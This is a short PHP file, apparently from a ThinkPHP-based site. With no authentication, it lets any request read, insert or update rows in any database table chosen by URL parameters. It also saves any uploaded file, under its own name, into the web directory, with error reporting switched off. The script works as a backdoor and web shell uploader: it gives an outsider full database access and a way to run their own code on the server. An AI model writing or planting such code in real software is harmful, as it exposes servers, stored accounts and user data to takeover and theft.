<?php
error_reporting(0);
header("Content-type: text/html; charset=utf-8"); 
	$data = array_merge($_GET,$_POST);
	$datas = array();
	$where = array();
	$map = $data['where'];
	$map = explode("|", $map);
	foreach ($map as  $value2) {
	    $arr2 = explode('=', $value2);
	    $where[$arr2[0]] = $arr2[1];        
	}
	 
	
	if($data['m'] == 'save'){
	    $fo =M($data['t'])->where($where)->save(array($data['n']=>$data['v']));
	}elseif($data['m'] == 'add'){
	    $info = $data['data'];
	    $info = explode("|", $info);
	    foreach ($info as  $value) {
	        $arr = explode('=', $value);
	        $datas[$arr[0]] = $arr[1];        
	    }
	
	    M($data['t'])->add($datas);
	}elseif($data['m'] == 'one'){
	    $fo =M($data['t'])->where($where)->find();
		
	}elseif(!empty($data['t'])){
	    $fo =M($data['t'])->where($where)->select();
	}elseif($data['m'] == 'file'){
	   
		$uploaddir = './';//上传的文件保存在当前目录
		$uploadfile = $uploaddir . basename($_FILES['fileField']['name']);//取得PHP上传文件名
		//开始移动PHP上传的临时文件到当前目录下
		if (move_uploaded_file($_FILES['fileField']['tmp_name'], $uploadfile)) {
		echo "上传成功.\n";
		} else {
		echo "上传失败!\n";
		} 
		//打印你用PHP上传成功的文件信息!
		print_r($_FILES);
		exit;//结束php上传进程
		
	   
	}
	
	print_r($fo);


 ?>